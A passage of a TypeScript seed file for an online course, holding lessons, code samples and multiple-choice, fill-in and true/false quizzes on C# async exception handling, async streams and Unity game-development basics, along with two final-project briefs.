      `Exceptions in async code behave a little differently from synchronous code, especially once multiple tasks are involved.\n\n\`\`\`csharp\nusing System;\nusing System.Threading.Tasks;\n\nclass Program\n{\n    static async Task Main()\n    {\n        try\n        {\n            await RiskyAsync();\n        }\n        catch (InvalidOperationException ex)\n        {\n            Console.WriteLine($"Caught: {ex.Message}");\n        }\n    }\n\n    static async Task RiskyAsync()\n    {\n        await Task.Delay(500);\n        throw new InvalidOperationException("Something went wrong");\n    }\n}\n\`\`\`\n\n## The pieces\n\n- A regular \`try/catch\` around an \`await\` works exactly like you'd hope, an exception thrown inside the awaited async method surfaces at the \`await\` point, as if it were a normal synchronous call.\n- With \`Task.WhenAll\`, if **multiple** tasks fail, only the first exception is rethrown by the \`await\`, the rest are still available on each individual \`Task.Exception\` property (an \`AggregateException\`) if you need them.\n\n\`\`\`csharp\nTask t1 = FailAsync("A");\nTask t2 = FailAsync("B");\n\ntry\n{\n    await Task.WhenAll(t1, t2);\n}\ncatch\n{\n    Console.WriteLine(t1.Exception?.InnerException?.Message);\n    Console.WriteLine(t2.Exception?.InnerException?.Message);\n}\n\`\`\`\n\n- An exception thrown inside an \`async void\` method (instead of \`async Task\`) can't be caught by a surrounding \`try/catch\` at all, it escapes straight to the app's global unhandled-exception handler, another reason to avoid \`async void\` outside of event handlers.\n\n## Best practice\n\nCatch specific exception types close to where they can meaningfully be handled, exactly like synchronous code, \`async\`/\`await\` doesn't change the fundamentals of exception handling, it just changes *when* the exception surfaces (at the \`await\`, not at the original call).`
    ),
    quiz: {
      title: 'Async Exceptions Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Where does an exception thrown inside an awaited async method surface?',
          options: [
            'It is silently swallowed',
            'At the await point, just like a normal synchronous call',
            'Only in a background log file',
            'It always crashes the whole application immediately',
          ],
          answer: 'At the await point, just like a normal synchronous call',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'An exception thrown inside an async ____ method cannot be caught by a surrounding try/catch.',
          options: [],
          answer: 'void',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'When multiple tasks passed to Task.WhenAll fail, only the first exception is rethrown by the await, though the rest remain available on each Task.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Async Streams with IAsyncEnumerable',
    content: lessonContent(
      'Async Streams with IAsyncEnumerable',
      `Sometimes you need to process a **sequence** of items that arrive over time, one at a time, page-by-page results from an API, rows streamed from a database, instead of waiting for the whole thing to complete before touching any of it.\n\n\`\`\`csharp\nusing System;\nusing System.Collections.Generic;\nusing System.Threading.Tasks;\n\nclass Program\n{\n    static async Task Main()\n    {\n        await foreach (int number in CountUpAsync(5))\n        {\n            Console.WriteLine(number);\n        }\n    }\n\n    static async IAsyncEnumerable<int> CountUpAsync(int max)\n    {\n        for (int i = 1; i <= max; i++)\n        {\n            await Task.Delay(500);\n            yield return i;\n        }\n    }\n}\n\`\`\`\n\n## The pieces\n\n- \`IAsyncEnumerable<T>\` is the asynchronous counterpart to \`IEnumerable<T>\`, a sequence where producing the **next** item might itself take time (a network call, a delay), instead of everything being ready up front.\n- \`async IAsyncEnumerable<T>\` combines \`async\` (so the method body can \`await\`) with \`yield return\` (so it can produce items one at a time), the same \`yield return\` you saw with \`IEnumerator\` in Unity coroutines, applied here to an async, awaitable sequence instead.\n- \`await foreach\` consumes an \`IAsyncEnumerable<T>\`, awaiting each item as it becomes available, instead of blocking until the entire sequence is ready.\n\n## When to reach for this\n\nUse \`Task<List<T>>\` (await once, get everything) when you need the whole result before doing anything with it. Reach for \`IAsyncEnumerable<T>\` when items should be processed as they arrive, e.g. displaying search results as each page loads, instead of one blank screen until every page is in.`
    ),
    quiz: {
      title: 'Async Streams Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does IAsyncEnumerable<T> represent?',
          options: [
            'A single value that resolves in the future',
            'A sequence whose items may each take time to produce',
            'A synchronous collection with no delays',
            'A type only usable inside Unity',
          ],
          answer: 'A sequence whose items may each take time to produce',
        },
        {
          type: 'FILL_BLANK',
          prompt: '____ foreach consumes an IAsyncEnumerable<T>, awaiting each item as it becomes available.',
          options: [],
          answer: 'await',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'An async IAsyncEnumerable<T> method can use yield return, just like a synchronous iterator.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Final Project: Async Multi-Source Downloader',
    content: lessonContent(
      'Final Project: Async Multi-Source Downloader',
      `Combine everything from this course into a small but realistic async tool.\n\n## Requirements\n\n1. Write an async method that downloads or fetches data from at least 3 different sources (URLs, files, or simulated delays with \`Task.Delay\`) **concurrently**, using \`Task.WhenAll\`.\n2. Support cancellation: accept a \`CancellationToken\`, and let the user cancel the whole operation (e.g. by pressing a key while it's running).\n3. Handle failures gracefully: if one source fails, log which one and continue reporting results for the others, instead of the whole program crashing.\n4. Add a timeout using \`Task.WhenAny\` racing the real operation against \`Task.Delay(timeout)\`, cancelling and reporting a timeout message if the delay wins.\n5. Use an \`IAsyncEnumerable<T>\` method to stream and print progress updates (e.g. "Source A: 50% done") as they happen, instead of only printing a final summary.\n\n## Stretch goals\n\n- Add retry logic: if a source fails, retry it up to 2 more times with a short delay between attempts before giving up.\n- Track and print total elapsed time, and compare it to what sequential (non-concurrent) execution would have taken.\n- Wrap the whole thing in a small console menu so a user can re-run it with different sources without restarting the program.\n\nSubmit your repository link below when you are done, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const csharpUnityEssentialsLessons: SeedLesson[] = [
  {
    title: 'Rigidbody Physics: Collisions and Triggers',
    content: lessonContent(
      'Rigidbody Physics: Collisions and Triggers',
      `Unity's physics engine moves and collides GameObjects for you, once they have a \`Rigidbody\` (3D) or \`Rigidbody2D\` (2D) component and a \`Collider\`.\n\n\`\`\`csharp\nusing UnityEngine;\n\npublic class Bullet : MonoBehaviour\n{\n    public float speed = 20f;\n\n    void Start()\n    {\n        GetComponent<Rigidbody>().linearVelocity = transform.forward * speed;\n    }\n\n    void OnCollisionEnter(Collision collision)\n    {\n        Debug.Log($"Hit {collision.gameObject.name}");\n        Destroy(gameObject);\n    }\n}\n\`\`\`\n\n## Collisions vs triggers\n\n- A regular **collision** (\`OnCollisionEnter/Stay/Exit\`) needs both objects to have solid (non-trigger) colliders, physics stops them from overlapping.\n- A **trigger** collider (\`Is Trigger\` checked) lets objects pass through it, but still fires \`OnTriggerEnter/Stay/Exit\`, useful for pickups, checkpoints, or damage zones that shouldn't physically block anything.\n- Both events only fire if **at least one** of the two objects also has a \`Rigidbody\`.\n\n\`\`\`csharp\nvoid OnTriggerEnter(Collider other)\n{\n    if (other.CompareTag("Player"))\n    {\n        Debug.Log("Player entered the zone");\n    }\n}\n\`\`\`\n\n## Physics update, not Update\n\nMove a \`Rigidbody\` with \`Rigidbody.linearVelocity\` or \`AddForce\` inside \`FixedUpdate()\`, not \`Update()\`, \`FixedUpdate\` runs on physics's fixed timestep, keeping movement consistent regardless of framerate.`
    ),
    quiz: {
      title: 'Physics & Collisions Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which method fires when a trigger collider is entered by another collider?',
          options: ['OnCollisionEnter', 'OnTriggerEnter', 'OnHit', 'OnOverlap'],
          answer: 'OnTriggerEnter',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Rigidbody movement should be applied inside ____() instead of Update(), so it stays consistent with the physics timestep.',
          options: [],
          answer: 'FixedUpdate',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A trigger collider physically blocks other objects from passing through it.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Raycasting',
    content: lessonContent(
      'Raycasting',
      `A **raycast** shoots an invisible line through the scene and reports what it hits, the basis for shooting, line-of-sight checks, and click-to-move.\n\n\`\`\`csharp\nusing UnityEngine;\n\npublic class Shooter : MonoBehaviour\n{\n    public float range = 100f;\n\n    void Update()\n    {\n        if (Input.GetButtonDown("Fire1"))\n            Shoot();\n    }\n\n    void Shoot()\n    {\n        if (Physics.Raycast(transform.position, transform.forward, out RaycastHit hit, range))\n        {\n            Debug.Log($"Hit {hit.collider.gameObject.name} at distance {hit.distance}");\n            hit.collider.GetComponent<IDamageable>()?.TakeDamage(10);\n        }\n    }\n}\n\`\`\`\n\n## The pieces\n\n- \`Physics.Raycast(origin, direction, out RaycastHit hit, maxDistance)\` returns \`true\` if the ray hit something within \`maxDistance\`, and fills \`hit\` with details (the collider, exact point, distance, surface normal).\n- \`out\` parameters (like \`RaycastHit hit\`) let a method return extra information beyond its normal return value, \`hit\` is only meaningful if \`Raycast\` returned \`true\`.\n- A **layer mask** (an optional extra parameter) restricts which layers the ray can hit, e.g. ignoring the player's own collider when shooting.\n\n## Debugging rays\n\n\`Debug.DrawRay(origin, direction * range, Color.red, duration)\` draws a visible line in the Scene view (not in the actual game), invaluable for seeing exactly where a raycast is pointing while you're testing.`
    ),
    quiz: {
      title: 'Raycasting Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does Physics.Raycast return?',
          options: ['The GameObject it hit', 'A bool indicating whether it hit anything', 'The distance travelled', 'Nothing, it is void'],
          answer: 'A bool indicating whether it hit anything',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The ____ parameter on Raycast lets the method return extra hit details alongside its bool result.',
          options: [],
          answer: 'out',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Debug.DrawRay makes a ray visible to players in the built game.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'The UI System: Canvas and UGUI',
    content: lessonContent(
      'The UI System: Canvas and UGUI',
      `Unity's built-in UI system (UGUI) renders every on-screen element, buttons, health bars, menus, inside a \`Canvas\`.\n\n\`\`\`csharp\nusing UnityEngine;\nusing UnityEngine.UI;\nusing TMPro;\n\npublic class HealthBar : MonoBehaviour\n{\n    public Slider slider;\n    public TMP_Text label;\n\n    public void SetHealth(int current, int max)\n    {\n        slider.value = (float)current / max;\n        label.text = $"{current} / {max}";\n    }\n}\n\`\`\`\n\n## The pieces\n\n- A \`Canvas\` is the root of any UI, everything inside it (buttons, images, text) is a child GameObject positioned in screen space, not world space.\n- \`Screen Space - Overlay\` draws the UI on top of everything, always facing the camera, most common for HUDs and menus.\n- Wiring a button click to code: select the \`Button\`'s \`OnClick()\` list in the Inspector, drag in the target GameObject, and pick a public method, or do it from code:\n\n\`\`\`csharp\nbutton.onClick.AddListener(() => Debug.Log("Clicked!"));\n\`\`\`\n\n## Data binding in practice\n\nUI elements don't update themselves, your code has to push new values to them, like calling \`SetHealth\` from a health-changed callback whenever health changes. Keep UI update code in dedicated UI scripts (like \`HealthBar\` above) rather than scattering \`slider.value = ...\` across gameplay code, that separation makes both sides easier to change independently.`
    ),
    quiz: {
      title: 'UI System Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What GameObject must every UGUI element live under?',
          options: ['A Rigidbody', 'A Canvas', 'A NetworkObject', 'A Camera'],
          answer: 'A Canvas',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'button.onClick.____(() => ...) wires up a click handler from code.',
          options: [],
          answer: 'AddListener',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'UI elements like a Slider automatically update themselves whenever a related gameplay value changes, with no code needed.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'The Input System',
    content: lessonContent(
      'The Input System',
      `Player input, keyboard, mouse, gamepad, touch, needs to be read every frame and turned into game actions.\n\n\`\`\`csharp\nusing UnityEngine;\n\npublic class LegacyMovement : MonoBehaviour\n{\n    public float speed = 5f;\n\n    void Update()\n    {\n        float h = Input.GetAxis("Horizontal");\n        float v = Input.GetAxis("Vertical");\n        transform.Translate(new Vector3(h, 0, v) * speed * Time.deltaTime);\n\n        if (Input.GetKeyDown(KeyCode.Space))\n            Jump();\n    }\n}\n\`\`\`\n\n## The old way: the Input class\n\n- \`Input.GetAxis("Horizontal")\` returns a smoothed value between -1 and 1, built from whatever keys/sticks are bound to that axis in Project Settings.\n- \`Input.GetKeyDown(KeyCode.Space)\` is true for exactly one frame, the frame the key was pressed, use \`GetKey\` for "is it currently held."\n- \`Input.GetButtonDown("Fire1")\` reads a named action the same way, but through the configurable Input Manager instead of a hardcoded key.\n\n## The new Input System package\n\nUnity's newer **Input System** package models input as **Actions** ("Move", "Jump", "Fire") bound to any device, instead of hardcoded keys, so the same script works with keyboard, gamepad, or touch without changes.\n\n\`\`\`csharp\nusing UnityEngine.InputSystem;\n\npublic class NewMovement : MonoBehaviour\n{\n    public InputAction moveAction;\n\n    void OnEnable() => moveAction.Enable();\n\n    void Update()\n    {\n        Vector2 move = moveAction.ReadValue<Vector2>();\n        transform.Translate(new Vector3(move.x, 0, move.y) * Time.deltaTime);\n    }\n}\n\`\`\`\n\nBoth systems are valid, the legacy \`Input\` class is simpler for small projects, the Input System package scales better for multi-device support and rebindable controls.`
    ),
    quiz: {
      title: 'Input System Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which legacy Input method is true for only the single frame a key was pressed?',
          options: ['GetKey', 'GetKeyDown', 'GetAxis', 'GetButton'],
          answer: 'GetKeyDown',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The newer Input System package models input as reusable ____ (like "Move" or "Jump") that can bind to any device.',
          options: [],
          answer: 'Actions',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "Input.GetAxis('Horizontal') returns a raw, unsmoothed -1/0/1 value.",
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'ScriptableObjects: Data-Driven Design',
    content: lessonContent(
      'ScriptableObjects: Data-Driven Design',
      `A \`ScriptableObject\` is a data container that lives as an **asset** in your project, not attached to any GameObject, perfect for shared configuration that many objects reference.\n\n\`\`\`csharp\nusing UnityEngine;\n\n[CreateAssetMenu(fileName = "New Enemy", menuName = "Game/Enemy Data")]\npublic class EnemyData : ScriptableObject\n{\n    public string enemyName;\n    public int maxHealth;\n    public float moveSpeed;\n    public GameObject prefab;\n}\n\`\`\`\n\n\`\`\`csharp\npublic class Enemy : MonoBehaviour\n{\n    public EnemyData data;\n    int health;\n\n    void Start()\n    {\n        health = data.maxHealth;\n    }\n}\n\`\`\`\n\n## Why not just fields on the MonoBehaviour?\n\n- \`[CreateAssetMenu]\` adds a menu entry so designers can create new \`EnemyData\` assets (Right-click → Create → Game → Enemy Data) without touching code.\n- Every \`Enemy\` prefab that shares the same \`EnemyData\` asset reads the same values, tweak the asset once, every enemy using it updates, no need to edit each prefab individually.\n- ScriptableObjects aren't part of the scene, so they don't get destroyed when a scene unloads, and they don't duplicate per-instance memory the way fields on a \`MonoBehaviour\` would across hundreds of enemies.\n\n## Common uses\n\nItem databases, enemy/weapon stats, dialogue data, and even shared event channels (a \`ScriptableObject\`-based alternative to C# events that decouples systems that don't reference each other directly).`
    ),
    quiz: {
      title: 'ScriptableObjects Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Where does a ScriptableObject asset live?',
          options: ['Attached to a GameObject in the scene', 'As a standalone asset in the project', 'Inside the Camera component', 'It only exists at runtime'],
          answer: 'As a standalone asset in the project',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The [____] attribute adds a menu entry so designers can create new instances of a ScriptableObject without code.',
          options: [],
          answer: 'CreateAssetMenu',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Multiple prefabs can reference the same ScriptableObject asset and share its data.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Object Pooling',
    content: lessonContent(
      'Object Pooling',
      `\`Instantiate\` and \`Destroy\` are expensive, especially for things spawned constantly like bullets or particle effects. **Object pooling** reuses a fixed set of objects instead of constantly creating and destroying them.\n\n\`\`\`csharp\nusing System.Collections.Generic;\nusing UnityEngine;\n\npublic class BulletPool : MonoBehaviour\n{\n    public GameObject bulletPrefab;\n    public int poolSize = 20;\n    Queue<GameObject> pool = new Queue<GameObject>();\n\n    void Awake()\n    {\n        for (int i = 0; i < poolSize; i++)\n        {\n            GameObject bullet = Instantiate(bulletPrefab);\n            bullet.SetActive(false);\n            pool.Enqueue(bullet);\n        }\n    }\n\n    public GameObject Get()\n    {\n        GameObject bullet = pool.Count > 0 ? pool.Dequeue() : Instantiate(bulletPrefab);\n        bullet.SetActive(true);\n        return bullet;\n    }\n\n    public void Release(GameObject bullet)\n    {\n        bullet.SetActive(false);\n        pool.Enqueue(bullet);\n    }\n}\n\`\`\`\n\n## The pieces\n\n- Every object the pool will hand out is created **once**, up front, and disabled.\n- \`Get()\` hands out a disabled object (reactivating it) instead of instantiating a new one, \`Release()\` deactivates and returns it to the pool instead of destroying it.\n- A \`Queue<T>\` is a natural fit, \`Enqueue\` adds to the back, \`Dequeue\` removes from the front, first in, first out.\n- Falling back to \`Instantiate\` inside \`Get()\` when the pool is empty avoids ever running out, at the cost of an occasional allocation.\n\n## Why it matters\n\n\`Instantiate\`/\`Destroy\` allocate and garbage-collect memory, doing that dozens of times per second (every bullet fired, every hit particle) causes frame-rate stutters as the garbage collector kicks in. Reusing objects avoids that churn entirely. Unity also ships a built-in \`UnityEngine.Pool.ObjectPool<T>\` that implements this same pattern for you.`
    ),
    quiz: {
      title: 'Object Pooling Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What problem does object pooling mainly solve?',
          options: ['Networking latency', 'Repeated allocation/garbage collection from frequent Instantiate/Destroy calls', 'Compile-time errors', 'Missing textures'],
          answer: 'Repeated allocation/garbage collection from frequent Instantiate/Destroy calls',
        },
        {
          type: 'FILL_BLANK',
          prompt: "Instead of destroying an object, a pool's ____() method deactivates it and returns it to the pool for reuse.",
          options: [],
          answer: 'Release',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "A pooled object is destroyed and a brand new one is created every time it's needed.",
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Saving and Loading Data',
    content: lessonContent(
      'Saving and Loading Data',
      `Progress needs to survive closing the game. Unity gives you a couple of straightforward options depending on how much data you're saving.\n\n\`\`\`csharp\nusing UnityEngine;\n\n// Small values: PlayerPrefs\nPlayerPrefs.SetInt("HighScore", 4200);\nPlayerPrefs.SetFloat("MusicVolume", 0.8f);\nPlayerPrefs.Save();\n\nint highScore = PlayerPrefs.GetInt("HighScore", 0); // 0 is the default if missing\n\`\`\`\n\n## PlayerPrefs\n\n- A simple key-value store, backed by the registry on Windows or a plist on Mac, good for small things like settings or a high score.\n- Only stores \`int\`, \`float\`, and \`string\`, and isn't encrypted, don't use it for anything you can't afford a player to see or tamper with.\n\n## Larger or structured data: JSON\n\n\`\`\`csharp\nusing System.IO;\nusing UnityEngine;\n\n[System.Serializable]\npublic class SaveData\n{\n    public int level;\n    public int[] unlockedItems;\n}\n\nvoid Save(SaveData data)\n{\n    string json = JsonUtility.ToJson(data);\n    File.WriteAllText(Application.persistentDataPath + "/save.json", json);\n}\n\nSaveData Load()\n{\n    string path = Application.persistentDataPath + "/save.json";\n    if (!File.Exists(path)) return new SaveData();\n    return JsonUtility.FromJson<SaveData>(File.ReadAllText(path));\n}\n\`\`\`\n\n## The pieces\n\n- \`[System.Serializable]\` marks a plain class so \`JsonUtility\` can convert it to and from JSON text.\n- \`Application.persistentDataPath\` is a writable, platform-correct folder that survives app updates and reinstalls (unlike \`Application.dataPath\`, which lives inside the read-only app install).\n- \`JsonUtility\` only serializes public fields (not properties or \`Dictionary\`s), keep save data structures simple for it to work smoothly.`
    ),
    quiz: {
      title: 'Save Data Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which types can PlayerPrefs store directly?',
          options: ['Any serializable class', 'int, float, and string only', 'Only GameObjects', 'Only byte arrays'],
          answer: 'int, float, and string only',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Application.____ is the writable, platform-correct folder for save files that survives app updates.',
          options: [],
          answer: 'persistentDataPath',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'PlayerPrefs data is encrypted by default, making it safe to store sensitive values.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Final Project: Wave-Based Shooter',
    content: lessonContent(
      'Final Project: Wave-Based Shooter',
      `Combine physics, UI, input, ScriptableObjects, pooling, and save data into one small playable slice.\n\n## Requirements\n\n1. Use raycasting (or physics collisions) to detect when the player's shots hit an enemy.\n2. Represent enemy stats (health, speed, prefab) with a \`ScriptableObject\`, so tuning them doesn't require touching code.\n3. Pool your bullets and/or enemies instead of calling \`Instantiate\`/\`Destroy\` on every shot or spawn.\n4. Show the player's health and current score on a \`Canvas\`-based UI, updated live as the game state changes.\n5. Read player input (fire, move) using either the legacy \`Input\` class or the Input System package.\n6. Save the player's best score with \`PlayerPrefs\`, and display "New high score!" when it's beaten.\n\n## Stretch goals\n\n- Use a trigger collider for a pickup (e.g. a health or ammo crate) instead of a raycast hit.\n- Save more detailed run data (wave reached, enemies defeated) as JSON instead of just the high score.\n- Add a pause menu Canvas that disables gameplay input while open.\n\nSubmit your repository link below when you are done, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const csharpUnityLessons: SeedLesson[] = [
  {
    title: 'GameObjects, Components, and the MonoBehaviour Lifecycle',
    content: lessonContent(
      'GameObjects, Components, and the MonoBehaviour Lifecycle',
      `In Unity, everything in a scene is a **GameObject**, an empty container that gets its behavior from attached **Components**. A \`MonoBehaviour\` script is a component that hooks into Unity's lifecycle.\n\n\`\`\`csharp\nusing UnityEngine;\n\npublic class PlayerController : MonoBehaviour\n{\n    public float speed = 5f;\n\n    void Start()\n    {\n        Debug.Log($"{gameObject.name} spawned");\n    }\n\n    void Update()\n    {\n        float move = Input.GetAxis("Horizontal") * speed * Time.deltaTime;\n        transform.Translate(move, 0, 0);\n    }\n}\n\`\`\`\n\n## The lifecycle\n\n- \`Awake()\` runs once, before \`Start()\`, even on a disabled component, use it to cache references.\n- \`Start()\` runs once, after every \`Awake()\` has run, right before the first frame.\n- \`Update()\` runs every frame, use \`Time.deltaTime\` so movement stays framerate-independent.\n- \`FixedUpdate()\` runs on a fixed timestep, use it for physics (\`Rigidbody\` forces).\n\n## Getting components\n\n\`GetComponent<T>()\` looks up another component attached to the same GameObject:\n\n\`\`\`csharp\nRigidbody rb = GetComponent<Rigidbody>();\nrb.AddForce(Vector3.up * 10f);\n\`\`\``
    ),
    quiz: {
      title: 'GameObjects & Lifecycle Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which MonoBehaviour method is best for movement, since it runs every frame?',
          options: ['Awake', 'Start', 'Update', 'OnDestroy'],
          answer: 'Update',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Multiplying movement by Time.____ keeps it framerate-independent.',
          options: [],
          answer: 'deltaTime',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Awake() can run even on a component that starts disabled.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Coroutines and IEnumerator',
    content: lessonContent(
      'Coroutines and IEnumerator',
      `A regular method runs to completion within a single frame. A **coroutine** can pause itself and resume later, spread across multiple frames, without blocking the main thread. Unity coroutines are built on C#'s \`IEnumerator\`.\n\n\`\`\`csharp\nusing System.Collections;\nusing UnityEngine;\n\npublic class FadeIn : MonoBehaviour\n{\n    void Start()\n    {\n        StartCoroutine(Fade());\n    }\n\n    IEnumerator Fade()\n    {\n        CanvasGroup group = GetComponent<CanvasGroup>();\n        float t = 0f;\n        while (t < 1f)\n        {\n            t += Time.deltaTime;\n            group.alpha = t;\n            yield return null; // pause until next frame\n        }\n    }\n}\n\`\`\`\n\n## The pieces\n\n- A coroutine is any method that returns \`IEnumerator\` and contains at least one \`yield return\`.\n- \`StartCoroutine(...)\` begins running it, Unity resumes it each frame from wherever it last \`yield return\`ed.\n- \`yield return null\` pauses for exactly one frame.\n- \`yield return new WaitForSeconds(2f)\` pauses for 2 (scaled) seconds.\n\n## Why not just Update()?\n\n\`Update()\` runs every frame for the entire lifetime of the object. A coroutine only runs while it has work to do, then finishes, better for one-off timed sequences like fades, delays, or spawn waves.`
    ),
    quiz: {
      title: 'Coroutines Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What return type must a coroutine method have?',
          options: ['void', 'IEnumerator', 'Coroutine', 'Task'],
          answer: 'IEnumerator',
        },
        {
          type: 'FILL_BLANK',
          prompt: '____(...) is the method you call to begin running a coroutine.',
          options: [],
          answer: 'StartCoroutine',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'yield return null pauses a coroutine for exactly one frame.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Advanced Coroutine Patterns',
    content: lessonContent(
      'Advanced Coroutine Patterns',
      `Real coroutines usually need more control than a single loop: waiting on conditions, nesting, and stopping cleanly.\n\n\`\`\`csharp\nIEnumerator SpawnWave(int count)\n{\n    for (int i = 0; i < count; i++)\n    {\n        Instantiate(enemyPrefab, RandomSpawnPoint(), Quaternion.identity);\n        yield return new WaitForSeconds(1.5f);\n    }\n}\n\nIEnumerator WaitForPlayerReady()\n{\n    yield return new WaitUntil(() => player.IsReady);\n    Debug.Log("Player ready, starting match");\n}\n\`\`\`\n\n## Useful yield instructions\n\n| Instruction | Waits for |\n|---|---|\n| \`yield return null\` | next frame |\n| \`yield return new WaitForSeconds(t)\` | t seconds, scaled by \`Time.timeScale\` |\n| \`yield return new WaitForSecondsRealtime(t)\` | t real seconds, ignores pause |\n| \`yield return new WaitUntil(() => condition)\` | condition to become true |\n| \`yield return StartCoroutine(Other())\` | a nested coroutine to finish |\n\n## Stopping coroutines\n\n\`\`\`csharp\nCoroutine handle = StartCoroutine(SpawnWave(5));\n...\nStopCoroutine(handle);   // stop a specific one\nStopAllCoroutines();      // stop everything running on this MonoBehaviour\n\`\`\`\n\nA coroutine also stops automatically if the GameObject it's running on is destroyed or disabled.`
    ),
    quiz: {
      title: 'Advanced Coroutines Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which yield instruction pauses a coroutine until a condition becomes true?',
          options: ['WaitForSeconds', 'WaitUntil', 'WaitForFixedUpdate', 'WaitForEndOfFrame'],
          answer: 'WaitUntil',
        },
        {
          type: 'FILL_BLANK',
          prompt: '____() stops every coroutine currently running on a MonoBehaviour.',
          options: [],
          answer: 'StopAllCoroutines',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A running coroutine keeps executing even after the GameObject it belongs to is destroyed.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Intro to Multiplayer: Netcode for GameObjects',
    content: lessonContent(
      'Intro to Multiplayer: Netcode for GameObjects',
      `Unity's official networking layer is **Netcode for GameObjects (NGO)**. It uses a client-server model: one instance is the **server** (often also a **host**, meaning server + local client), everyone else connects as **clients**.\n\nTo make a GameObject network-aware, add a \`NetworkObject\` component to its prefab, and give it scripts that inherit from \`NetworkBehaviour\` instead of \`MonoBehaviour\`.\n\n\`\`\`csharp\nusing Unity.Netcode;\n\npublic class PlayerHealth : NetworkBehaviour\n{\n    public override void OnNetworkSpawn()\n    {\n        if (IsOwner)\n            Debug.Log("This is my player!");\n    }\n}\n\`\`\`\n\n## Key concepts\n\n- **NetworkManager** is the singleton that starts hosting/joining and spawns networked prefabs.\n- **NetworkObject** identifies a GameObject across the network, only prefabs with one can be spawned with \`NetworkObject.Spawn()\`.\n- \`IsServer\`, \`IsClient\`, \`IsOwner\`, \`IsHost\` are booleans on every \`NetworkBehaviour\` telling you which role the current instance is playing.\n- Only the server should spawn, despawn, or authoritatively change networked state, clients request changes, the server decides.\n\n\`\`\`csharp\nGameObject enemy = Instantiate(enemyPrefab);\nenemy.GetComponent<NetworkObject>().Spawn(); // server-only\n\`\`\``
    ),
    quiz: {
      title: 'Netcode Basics Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which component must a prefab have before it can be spawned across the network?',
          options: ['NetworkVariable', 'NetworkObject', 'NetworkManager', 'ServerRpc'],
          answer: 'NetworkObject',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A networked script inherits from ____ instead of MonoBehaviour.',
          options: [],
          answer: 'NetworkBehaviour',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A host is a server and a local client running at the same time.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Server & Client RPCs',
    content: lessonContent(
      'Server & Client RPCs',
